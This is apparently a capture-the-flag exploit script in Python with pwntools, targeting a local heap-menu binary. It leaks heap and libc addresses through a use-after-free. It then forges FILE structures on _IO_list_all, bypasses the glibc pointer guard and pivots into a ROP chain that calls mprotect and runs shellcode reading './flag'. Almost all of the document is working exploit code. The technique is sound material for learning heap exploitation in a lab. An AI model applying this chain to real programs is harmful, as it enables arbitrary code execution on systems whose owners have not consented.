from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./pwn")
def init(key):
    sh.sendlineafter(b"enter your key >>\n", str(key).encode())
def cmd(c):
    sh.sendlineafter(b"enter your command: \n", str(c).encode())
def add(sizeoption):
    cmd(1)
    sh.sendlineafter(b"choise: ", str(sizeoption).encode())
def dele(idx):
    cmd(2)
    sh.sendlineafter(b"Index: \n", str(idx).encode())
def edit(idx,ctt):
    cmd(3)
    sh.sendlineafter(b"Index: ", str(idx).encode())
    sh.sendafter(b"Message: \n", ctt)
def show(idx):
    cmd(4)
    sh.sendlineafter(b"Index: ", str(idx).encode())
def rol(data):
    print(data)
    dl=bin(data)[2:]
    dl=dl.rjust(64,"0")
    print(dl)
    res=''
    for i in range(64):
        res+=dl[(i+0x11)%64]
    print(res)
    res=int(res,2)
    return res
large=3
medium=2
small=1
#l = 2*key + 0x10
#m = key + 0x20
#s = key + 0x10
#2*m-2*s=0x20
#2*m-l=0x30
#               psz sz 
#        psz sz fd  bk
#        fd  bk fn  bn  
# psz sz fn  bn
# fd  bk
# fn  bn

init(10)
add(medium) #0
add(medium) #1
add(small) #2
 
dele(2)
dele(1)
dele(0)
#all to top

add(small) #3 
add(small) #4
add(small) #5 ahead 0x20 from 2
add(small) #6

dele(3)
dele(5)
show(5)
sh.recvuntil(b'\n')
leak_heap=u64(sh.recv(8))
leak_libc=u64(sh.recv(8))

heapbase=leak_heap-0x290
libcbase=leak_libc-0x219cc0
success("heapbase:"+hex(heapbase))
success("libcbase:"+hex(libcbase))
dele(4)
dele(6)
# all to top

add(large) #7
add(small) #8 ahead 0x30 form 2
add(small) #9
dele(8)
add(large)

libc=ELF("./libc.so.6")
libc.address=libcbase
heap5=heapbase+0x1800
# iolistall=libcbase+0x21a660
iolistall=libc.sym._IO_list_all
success(hex(iolistall))

wstrn_jumps=libcbase+0x215dc0
ptr_guard=libcbase-0x28c0+0x30
lock=libcbase+0xa50
ptr_guard_value=heap5+0x100
cookie_jumps=libcbase+0x215b80
pop_rdi=0x000000000002a6c5+libcbase
pop_rsi=0x000000000002c081+libcbase
pop_rdx=0x000000000005f65a+libcbase
pop_r12_r13=0x000000000002bcbb+libcbase
mprotect=libc.sym['mprotect']
shellcode=shellcraft.open("./flag")
shellcode+=shellcraft.read('rax','rsp',0x40)
shellcode+=shellcraft.write('1','rsp',0x40)
asmshellcode=asm(shellcode)

magic=0x0000000000165fa0+libcbase # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
rdx_to_rsp=0x0000000000059fa0+libcbase #mov rsp, rdx ; ret
chan=heap5+0x100 #heap5 is fakefile itself
ropchan_pos=heap5+0x300
shellcode_pos=heap5+0x500
#heap5+0x300
ROPchan=flat(
    {
        0x8:ropchan_pos+0x10,
        0x10:{
            0x0:pop_rdi,
            0x8:shellcode_pos&~0xfff,
            0x10:pop_r12_r13,
            0x18:0xdeadbeef,
            0x20:rdx_to_rsp,
            0x28:[
                pop_rsi,
                0x1000,
                pop_rdx,
                7,
                mprotect,
                shellcode_pos   
            ]
        },
    }
)
fakefile1=flat(
    {
        0x8:0xa81,
        0x68:chan,
        0x88:lock,
        0xa0:ptr_guard,
        0xd8:wstrn_jumps
    },
    filler=b'\x00'
)

#heap5+0x100
fakefile2=flat(
    {
        0x20:0,
        0x28:1,
        0x88:lock,
        0x74:p32(8),
        0xc0:0,
        0xd8:cookie_jumps+0x58,
        0xe0:[ropchan_pos,rol(magic^ptr_guard_value)]
    },
    filler=b'\x00'
)

payload=flat(
    {
        0x8:iolistall-0x20,
        0x10:fakefile1,
        0x100:fakefile2,
        0x300:ROPchan,
        0x500:asmshellcode,
        0xa90:[0x0,0xab1]
    },
    filler=b'\x00'
)

# payload=p64(0xdeadbeef)*2+p64(0)+p64(0xa81)
edit(5, payload)
gdb.attach(sh)

dele(2)
add(large)

cmd(5)
sh.interactive()